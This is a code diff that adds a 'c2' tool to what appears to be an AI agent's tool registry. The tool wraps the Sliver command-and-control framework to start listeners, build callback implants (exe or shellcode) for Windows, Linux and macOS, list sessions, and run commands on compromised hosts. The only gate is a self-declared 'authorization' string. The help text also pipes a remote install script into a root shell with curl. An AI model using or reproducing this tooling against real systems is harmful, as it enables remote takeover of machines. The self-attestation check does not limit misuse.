@@ -1303,6 +1303,99 @@ def tool_wifi_crack(args: dict) -> str:
 
 
 
+# --- C2 orchestration (AUTHORIZED ADVERSARY EMULATION ONLY) -----------------
+# A thin manager around a standard open-source C2 framework — Sliver
+# (BishopFox/sliver, MIT) by default — for authorized red-team / adversary-
+# emulation engagements: stand up a listener, generate a beacon/implant for the
+# authorized scope, list sessions/beacons, run a command in a session. Same hard
+# gate as the other offensive tools: a 'target' (the engagement/scope) plus an
+# 'authorization' attestation, SCOPE.md-confined when present.
+# It ORCHESTRATES a known framework; it does not build custom implants, AV/EDR
+# evasion, or anything for mass/unauthorized deployment. Live interactive shells
+# belong in a real sliver-client — this drives the scriptable operations.
+SLIVER_BIN = os.environ.get("SYGNIF_PY_SLIVER_BIN", "sliver-server")
+
+
+def _sliver(console_script: str, timeout: int | None = None) -> tuple[str, int, str]:
+    """Pipe newline-separated console commands to sliver-server (best-effort;
+    Sliver has no one-shot flag, so we feed the console over stdin)."""
+    cmd = "printf '%s\\n' " + shlex.quote(console_script) + " | " + SLIVER_BIN
+    return _off_run(cmd, timeout or OFFENSIVE_TIMEOUT)
+
+
+def tool_c2(args: dict) -> str:
+    """Manage a Sliver C2 for an authorized engagement (listener/generate/sessions/exec)."""
+    op = str(args.get("op", "") or args.get("action", "status")).strip().lower()
+
+    # status/help never touch a target — pure local capability check.
+    if op in ("status", "check", ""):
+        o, rc, where = _off_run(
+            "command -v " + shlex.quote(SLIVER_BIN) + " && " + shlex.quote(SLIVER_BIN)
+            + " version 2>/dev/null | head -5", 30)
+        if rc != 0 or not o.strip():
+            return ("c2: Sliver not installed. It's the standard open-source C2 for authorized "
+                    "red-team work (BishopFox/sliver, MIT). Install: "
+                    "`curl https://sliver.sh/install | sudo bash`, or `apt install sliver` on Kali. "
+                    "Set SYGNIF_PY_SLIVER_BIN if the binary name differs (default " + SLIVER_BIN + ").")
+        return _off_report("c2 status", "n/a", SLIVER_BIN + " version", o, rc, where)
+    if op == "help":
+        return ("c2 ops: status | listener | generate | sessions | beacons | exec. "
+                "All except status need target + authorization. "
+                "listener {op:listener, proto:https|http|mtls, lport, lhost}. "
+                "generate {op:generate, os:windows|linux|darwin, arch:amd64, format:exe|shellcode|shared, "
+                "proto:https, lhost, lport, beacon:true, save:/path}. "
+                "exec {op:exec, session:<id>, command:'whoami'}.")
+
+    target = str(args.get("target", "")).strip()
+    g = _authz(args, target)
+    if g:
+        return g
+    auth = args.get("authorization", "")
+
+    if op == "listener":
+        proto = str(args.get("proto", "https")).lower()
+        lport = str(args.get("lport", "443" if proto == "https" else "80")).strip()
+        lhost = str(args.get("lhost", "")).strip()
+        line = {"https": "https --lport " + lport, "http": "http --lport " + lport,
+                "mtls": "mtls --lport " + lport}.get(proto, "https --lport " + lport)
+        if lhost:
+            line += " --lhost " + lhost
+        o, rc, where = _sliver(line + "\njobs\nexit", 120)
+        return _off_report("c2 listener", auth, line, o, rc, where)
+
+    if op == "generate":
+        os_ = str(args.get("os", "windows")).lower()
+        arch = str(args.get("arch", "amd64")).lower()
+        fmt = str(args.get("format", "exe")).lower()
+        proto = str(args.get("proto", "https")).lower()
+        lhost = str(args.get("lhost", "")).strip()
+        lport = str(args.get("lport", "443")).strip()
+        save = str(args.get("save", "/tmp/implant")).strip()
+        beacon = "beacon " if str(args.get("beacon", "")).lower() in ("1", "true", "yes") else ""
+        if not lhost:
+            return "c2 generate: give 'lhost' (the C2 callback host for this authorized engagement)."
+        gen = ("generate " + beacon + "--os " + os_ + " --arch " + arch + " --format " + fmt
+               + " --" + proto + " " + lhost + ":" + lport + " --save " + save)
+        o, rc, where = _sliver(gen + "\nexit", 600)
+        return _off_report("c2 generate", auth, gen, o, rc, where)
+
+    if op in ("sessions", "beacons"):
+        o, rc, where = _sliver(op + "\nexit", 60)
+        return _off_report("c2 " + op, auth, op, o, rc, where)
+
+    if op == "exec":
+        sid = str(args.get("session", "") or args.get("id", "")).strip()
+        command = str(args.get("command", "") or args.get("cmd", "")).strip()
+        if not sid or not command:
+            return "c2 exec: give 'session' (id) and 'command'. For live interactive control use sliver-client."
+        script = "sessions -i " + sid + "\nexecute -o -- " + command + "\nbackground\nexit"
+        o, rc, where = _sliver(script, 120)
+        return _off_report("c2 exec", auth, "session " + sid + ": " + command, o, rc, where)
+
+    return ("c2: unknown op '" + op + "'. Use status | listener | generate | sessions | beacons | "
+            "exec (see op=help).")
+
+
 # name -> {desc, args (name->hint), func}
 BUILTIN_TOOLS: dict[str, dict] = {
     "shell": {
@@ -1525,6 +1618,15 @@ BUILTIN_TOOLS: dict[str, dict] = {
                  "(hcxdumptool). Requires a monitor-mode 'interface', a 'bssid', and 'authorization'."),
         "args": {"interface": "monitor-mode iface e.g. wlan0mon", "bssid": "target AP BSSID/SSID you are authorized to test", "authorization": "attestation", "seconds": "capture window (default 60)", "out": "output pcapng path", "extra": "optional flags"},
         "func": tool_wifi_capture,
+    },
+    "c2": {
+        "desc": ("Manage a Sliver C2 for an AUTHORIZED red-team / adversary-emulation engagement: "
+                 "status, start a listener, generate a beacon/implant for the authorized scope, "
+                 "list sessions/beacons, or exec a command in a session. Requires 'target' "
+                 "(engagement/scope) + 'authorization' for everything except status; SCOPE.md-"
+                 "confined. Orchestrates a standard framework — no custom implants/evasion."),
+        "args": {"op": "status|listener|generate|sessions|beacons|exec|help", "target": "engagement/scope you are authorized to test", "authorization": "attestation", "proto": "https|http|mtls", "lhost": "C2 callback host", "lport": "listener port", "os": "implant os", "arch": "implant arch", "format": "exe|shellcode|shared", "beacon": "true for a beacon", "save": "implant output path", "session": "session id (exec)", "command": "command to run (exec)"},
+        "func": tool_c2,
     },
     "wifi_crack": {
         "desc": ("Convert a WPA capture to a hash and crack it offline (hcxpcapngtool + hashcat, "
